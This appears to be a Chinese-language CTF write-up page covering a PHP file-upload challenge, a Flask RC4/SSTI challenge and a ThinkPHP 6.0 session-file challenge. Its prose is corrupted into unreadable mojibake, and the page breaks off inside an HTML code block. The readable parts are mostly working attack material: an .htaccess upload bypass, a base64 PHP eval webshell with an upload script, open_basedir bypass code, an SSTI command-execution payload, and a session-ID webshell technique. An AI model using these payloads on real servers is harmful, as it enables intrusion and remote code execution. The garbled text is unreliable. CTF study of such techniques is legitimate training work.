<p>æˆ‘ä»¬ä»get_the_flag()ä¸Šæ‰‹ï¼Œ<br>å‡½æ•°æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œä¸”å¯¹åç¼€åè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½ä¸Šä¼ æœ‰phçš„åç¼€æ–‡ä»¶ï¼Œphtmlï¼Œphpç­‰ä¹Ÿä¸èƒ½ä¸Šä¼ äº†ï¼Œå¯ä»¥è€ƒè™‘.htaccesså’Œ.user.iniï¼Œä¸è¿‡è¿™é‡Œ.user.iniå¥½åƒä¸è¡Œï¼Œå¯¹å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½åŒ…å«&lt;?,ç”±äºè¿™é‡Œç‰ˆæœ¬è¿‡é«˜ï¼Œæ‰€ä»¥<script language="php"></script>æ— æ³•ä½¿ç”¨<br>è¿™é‡Œçš„è§£å†³æ–¹æ³•æ˜¯å°†ä¸€å¥è¯æœ¨é©¬è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå†.htaccessä¸­åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œè§£ç ï¼Œè¿˜æœ‰ä¸ªæ–‡ä»¶å¤´æ£€æµ‹ï¼Œä¸€èˆ¬éƒ½ç”¨GIF89aè¿›è¡Œç»•è¿‡ï¼Œä½†è¿™é‡Œä¼šå‡ºç°é—®é¢˜ï¼Œ.htaccessæ–‡ä»¶ä¼šæ— æ³•ç”Ÿæ•ˆï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨#define width 1337 #define height 1337è¿›è¡Œç»•è¿‡ï¼Œ#åœ¨.htaccessä¸­è¡¨ç¤ºæ³¨é‡Š<br>æ¯”è¾ƒå®Œå…¨çš„htaccessè§£é‡Š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8267?time__1311=n4+xuDgDBDyBD=D77D/+W4M0+34iIqm5x&alichlgref=https://www.cnblogs.com/">Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§</a><br>æ‰€ä»¥æˆ‘ä»¬çš„.htaccessæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 1337 </span><br>AddType application/x-httpd-php .ahhh  <span class="hljs-meta">#å¯¹.ahhhåç¼€çš„æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶æ‰§è¡Œ</span><br>php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br></code></pre></td></tr></table></figure>

<p>shell.ahhh</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF89a12</span>		#<span class="hljs-number">12</span>æ˜¯ä¸ºäº†è¡¥è¶³<span class="hljs-number">8</span>ä¸ªå­—èŠ‚ï¼Œæ»¡è¶³base64ç¼–ç çš„è§„åˆ™,<span class="hljs-number">4</span>çš„å€æ•°<br><span class="hljs-attribute">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs</span>/Pg==<br></code></pre></td></tr></table></figure>

<p>ä¸Šä¼ è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>import base64<br><br>htaccess = b<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337 </span><br><span class="hljs-string">AddType application/x-httpd-php .ahhh</span><br><span class="hljs-string">php_value auto_append_file &quot;</span>php:<span class="hljs-comment">//filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">shell = b&quot;</span>GIF89a12<span class="hljs-string">&quot; + base64.b64encode(b&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;)</span><br><span class="hljs-string">url = &quot;</span>http:<span class="hljs-comment">//95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span><br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>data = &#123;<span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>response = requests.<span class="hljs-title function_ invoke__">post</span>(url=url, data=data, files=files)<br><span class="hljs-keyword">print</span>(response.text)<br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.ahhh&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>response = requests.<span class="hljs-title function_ invoke__">post</span>(url=url, data=data, files=files)<br><span class="hljs-keyword">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/five3/article/details/74913742">pythonçš„requestså‘é€&#x2F;ä¸Šä¼ å¤šä¸ªæ–‡ä»¶</a></p>
<p><img src="/images/45EAA90DD51A4524B05CFB719E3CF684.png" srcset="/img/loading.gif" lazyload><br>å¾—åˆ°è·¯å¾„<br>è¿ä¸€ä¸‹èšå‰‘<br><img src="/images/6A11D0003F384441BE67422C65C55FB9.png" srcset="/img/loading.gif" lazyload><br>å¾ˆæ„å¤–çš„æ˜¯æˆ‘å¯ä»¥ç›´æ¥è®¿é—®æ ¹ç›®å½•ï¼Œä¸”èƒ½è¯»å–åˆ°flagçš„å€¼<br>åœ¨phpé…ç½®é‡Œå¯ä»¥çœ‹åˆ°<br><img src="/images/A51B191187D14954B78295EFBB0BE955.png" srcset="/img/loading.gif" lazyload><br>æˆ‘ä»¬åªèƒ½è®¿é—®&#x2F;htmlä¸‹å’Œ&#x2F;tmpä¸‹çš„æ–‡ä»¶<br>è¿™é‡Œæˆ‘ä»¬éœ€è¦ç»•è¿‡open_basedir<br>å‚è€ƒ<a href="https://xz.aliyun.com/t/4720?time__1311=n4+xnD0D9DBDgG7Y5GNepDUhDIowDmxhqeAKvbx&alichlgref=https://link.csdn.net/?target=https%253A%252F%252Fxz.aliyun.com%252Ft%252F4720">bypass open_basedirçš„æ–°æ–¹æ³•</a></p>
<p>ç›´æ¥ç”¨å®ƒçš„ä»£ç </p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">chdir</span>(&#x27;img&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;/&#x27;);<span class="hljs-built_in">var_dump</span>(scandir(&quot;/&quot;));<br></code></pre></td></tr></table></figure>
<p>å¾—åˆ°<br><img src="/images/1C225E976EAD4011926B0378B4451A0A.png" srcset="/img/loading.gif" lazyload></p>
<p>åœ¨è¯»å–</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-built_in">echo</span>(file_get_contents(<span class="hljs-string">&#x27;/THis_Is_tHe_F14g&#x27;</span>));<br></code></pre></td></tr></table></figure>
<p>è·å¾—flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">44</span>ad039b-<span class="hljs-number">8376</span>-<span class="hljs-number">46</span>ac-ba89-<span class="hljs-number">405</span>bec17ded2&#125;<br></code></pre></td></tr></table></figure>



<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p>è¿›å…¥ç¯å¢ƒ<br>é¢˜ç›®è®©æˆ‘ä»¬æ‰¾secretï¼Œå…ˆrobots.txtæ‰¾ä¸€æ‰¾<br>It is Android ctf<br>ä¸çŸ¥é“ä»€ä¹ˆæ„æ€ï¼Œé‚£ä¹ˆè¯•è¯•è¿›å…¥secretè·¯å¾„ä¸‹<br>Tell me your secret.I will encrypt it so others canâ€™t see<br>è¿˜è¦secretï¼Œé‚£ä¹ˆç»™å®ƒä¸€ä¸ªsecretå‚æ•°<br>è¾“å…¥0ï¼Œ1ï¼Œ2é¡µé¢æ˜¾ç¤ºä¸åŒçš„å­—ç¬¦<br>åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆè§„å¾‹<br>éšä¾¿è¾“å…¥ä¸€ä¸ªé•¿ä¸€ç‚¹çš„æ•°å­—æˆ–å­—ç¬¦<br><img src="/images/AB635E37F9B34eccBC86040CCA879EDD.png" srcset="/img/loading.gif" lazyload><br>æŠ¥é”™äº†ï¼Œä½†ä¹Ÿæš´éœ²äº†éƒ¨åˆ†æºç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯flaskï¼Œpythonç‰ˆæœ¬æ˜¯2.7<br>æ‰¾åˆ°åŠ æ·±çš„ä¸€æ®µä»£ç <br><img src="/images/F7EC073B2F7743f4810C06D53C4E2A64.png" srcset="/img/loading.gif" lazyload><br>ä¸ºRC4åŠ å¯†ç®—æ³•ï¼Œå¯†é’¥æ³„éœ²äº†ï¼Œå°†æ‰€å‘é€å†…å®¹è§£å¯†ä¹‹åä¼šè¢«æ¸²æŸ“ï¼Œè€ƒè™‘åˆ°å­˜åœ¨æ¨¡æ¿æ³¨å…¥<br>æ‰¾ä¸€ä¸ªRC4åŠ å¯†è„šæœ¬</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import <span class="hljs-built_in">base64</span><br>from urllib.parse import quote<br>def rc4_main(<span class="hljs-built_in">key</span> = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span>):<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;</span>)<br>    s_box = rc4_init_sbox(<span class="hljs-built_in">key</span>)<br>    crypt = str(rc4_excrypt(message, s_box))<br>    # <span class="hljs-built_in">print</span>(crypt)<br>    <span class="hljs-built_in">return</span>  crypt<br>def rc4_init_sbox(<span class="hljs-built_in">key</span>):<br>    s_box = list(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot;</span> <span class="hljs-symbol">%</span> s_box)<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + ord(<span class="hljs-built_in">key</span>[i <span class="hljs-symbol">%</span> len(<span class="hljs-built_in">key</span>)])) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;</span><span class="hljs-symbol">%</span> s_box)<br>    <span class="hljs-built_in">return</span> s_box<br>def rc4_excrypt(plain, <span class="hljs-built_in">box</span>):<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;</span>)<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        j = (j + <span class="hljs-built_in">box</span>[i]) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        <span class="hljs-built_in">box</span>[i], <span class="hljs-built_in">box</span>[j] = <span class="hljs-built_in">box</span>[j], <span class="hljs-built_in">box</span>[i]<br>        t = (<span class="hljs-built_in">box</span>[i] + <span class="hljs-built_in">box</span>[j]) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        k = <span class="hljs-built_in">box</span>[t]<br>        res.<span class="hljs-built_in">append</span>(chr(ord(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-built_in">join</span>(res)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %quote(cipher))<br>    <span class="hljs-built_in">return</span> (str(<span class="hljs-built_in">base64</span>.b64encode(cipher.encode(&#x27;utf-<span class="hljs-number">8</span>&#x27;)), &#x27;utf-<span class="hljs-number">8</span>&#x27;))<br>rc4_main(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>åŠ å¯†æœ‰ç‚¹æ‰ä¸ä½å¤´è„‘ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªè§£é‡Šçš„æ¯”è¾ƒæ¸…æ™°<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1G64y1Y7p4/?spm_id_from=333.337.search-card.all.click&vd_source=1cf6120088cfd0411cf76da1c98383fb">RC4åŠ å¯†ç®—æ³•</a></p>
<p><img src="/images/D00CD397F38444d5B79D6260F505DBA6.png" srcset="/img/loading.gif" lazyload></p>
<p>æäº¤åå°±å¯ä»¥è·å–flagäº†<br><img src="/images/4AB2BC9DB8054323BDE54F6B662FE158.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>æœ‰æ³¨å†Œç™»å½•åŠŸèƒ½ï¼Œå…ˆæ€€ç–‘ä¸€ä¸‹xssï¼Œè¯•è¯•xssè¯­å¥<br><img src="/images/50955E21F1B349019338CEF969CB6E4B.png" srcset="/img/loading.gif" lazyload></p>
<p>æ³¨å†Œä¸€ä¸‹ï¼Œå¼¹å‡ºæŠ¥é”™ä¿¡æ¯å‘Šè¯‰æ˜¯thinkphpæ¡†æ¶6.0ç‰ˆæœ¬</p>
<p><img src="/images/3480C8D74A0B47058B1D1CA4772A1C81.png" srcset="/img/loading.gif" lazyload></p>
<p>æœä¸€ä¸‹å‘ç°è¿™ä¸ªç‰ˆæœ¬æœ‰ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_29009501/article/details/116093713?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~PaidSort-1-116093713-blog-123237118.235%5Ev43%5Epc_blog_bottom_relevance_base8&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~PaidSort-1-116093713-blog-123237118.235%5Ev43%5Epc_blog_bottom_relevance_base8&utm_relevant_index=1">ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´</a></p>
<p>è¿™ä¸ªæ¡†æ¶è¿˜æœ‰å¾ˆå¤šå…¶å®ƒçš„æ¼æ´</p>
<p>å¯ç”¨dirsearchæ‰«å‡º<code>www.zip</code>æºç æ³„éœ²<br>åœ¨app&#x2F;home&#x2F;controller&#x2F;Member.phpä¸­æ‰¾åˆ°ç½‘ç«™åŠŸèƒ½çš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">......&lt;ä»¥ä¸Šä»£ç çœç•¥&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);            <br>            &#125;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>            &#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-variable">$recordArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$record</span>);<br>                <span class="hljs-variable">$recordLen</span> = <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$recordArr</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$recordLen</span> &gt;= <span class="hljs-number">3</span>)&#123;<br>                    <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$recordArr</span>);<br>                    <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$recordArr</span>) . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);    <span class="hljs-comment">//æ³¨æ„è¿™é‡Œï¼Œç›´æ¥å°†æœç´¢çš„å†…å®¹å†™å…¥äº†æœåŠ¡å™¨ç”Ÿæˆçš„SESSIONæ–‡ä»¶ä¸­</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$record</span> . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">View</span>(<span class="hljs-string">&quot;search&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æ ¹æ®ThinkPHP6.0.0ç‰ˆæœ¬çš„æ¼æ´æˆå› ï¼Œå¾—å‡ºè¿™æ˜¯ä¸€ä¸ªç”±äºä¸å®‰å…¨çš„SessionIdå¯¼è‡´çš„ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´<br>æ¼æ´åˆ©ç”¨çš„æ–¹æ³•æ˜¯ï¼šæ„é€ PHPSESSIDçš„å€¼ï¼Œä¸”åç¼€ä¸ºphpï¼Œæ€»å…±32ä½<br>å…ˆæ³¨å†Œ<br>ç”¨burpæŠ“å–,ä¿®æ”¹PHPSESSIDçš„å€¼<br><img src="/images/E82C046F1859405f8BA151BF05C4C230.png" srcset="/img/loading.gif" lazyload><br>ç™»å½•<br>æœ¬é¢˜ä¸­ï¼Œæœç´ çš„å†…å®¹ç›´æ¥è¢«å†™å…¥äº†SESSION</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">session(<span class="hljs-string">&quot;Record&quot;</span>,implode(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-symbol">$recordArr</span>) . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-symbol">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬åœ¨æœç´¢æ¡†å†™å…¥shell<br><img src="/images/96567671AD34b85BE2C6B5484094F63.png" srcset="/img/loading.gif" lazyload><br>æäº¤å®Œshellå†…å®¹åå¯ä»¥åœ¨&#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.phpä¸­å¾—åˆ°æˆ‘ä»¬çš„shell<br><img src="/images/1398418967A347a68D8380A9A7DB2EF3.png" srcset="/img/loading.gif" lazyload><br>å‘ç°ä¸€äº›é‡è¦å‡½æ•°è¢«ç¦äº†<br><img src="/images/CD6A3D5E30E44b9291BCCD3527099549.png" srcset="/img/loading.gif" lazyload><br>è¿æ¥èšå‰‘<br><img src="/images/53BE9C8D0DA84c0989423A0F4EEC29ED.png" srcset="/img/loading.gif" lazyload><br>flagä¸ºç©ºï¼Œé‚£ä¹ˆå°±è¦ç”¨readflagè¯»å–flag<br><img src="/images/1B8B00A46E3149e4BC39198427A276A3.png" srcset="/img/loading.gif" lazyload><br>æ²¡æœ‰æƒé™ï¼Œç”¨èšå‰‘é‡Œçš„æ’ä»¶disable_functionsç»•è¿‡<br><img src="/images/E62D81242CD2400884944C9A3AB0E4F0.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªå°±åˆšåˆšå¥½<br>åŠ è½½æ’ä»¶å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†<br><img src="/images/8A74149033774a169C2F833832F1C739.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ä¸Šä¼ exp<br>æ‰¾åˆ°<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">PHP7.0-7.4ç‰ˆæœ¬çš„çªç ´disable_functionçš„exp</a><br>æŠŠæ‰§è¡Œçš„å‘½ä»¤ä¿®æ”¹ä¸º&#x2F;readflag,ç„¶åå°†expä¸Šä¼ è‡³shellä¸­å³å¯è·å¾—flagåœ¨èšå‰‘ä¸­æ‰¾ä¸ªèƒ½ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œæ¯”å¦‚&#x2F;var&#x2F;tmpä¸­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 